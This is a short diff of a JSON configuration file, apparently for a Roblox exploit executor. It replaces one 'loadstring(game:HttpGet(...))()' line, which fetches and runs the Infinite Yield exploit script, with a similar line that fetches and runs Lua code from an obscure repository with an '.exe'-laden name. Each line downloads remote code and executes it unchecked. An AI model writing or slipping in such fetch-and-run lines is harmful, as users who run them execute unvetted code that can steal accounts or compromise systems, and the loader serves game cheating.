@@ -4,5 +4,5 @@
   "secret": {
     "id": "yd127ad412"
   },
-  "loadstring": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source\"))()"
+  "loadstring": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/higuysdorobloxjoaopk-maker/-src_.exe-lua.exe-/refs/heads/main/Cloud/Scripts/1/Script.lua\"))()"
 }
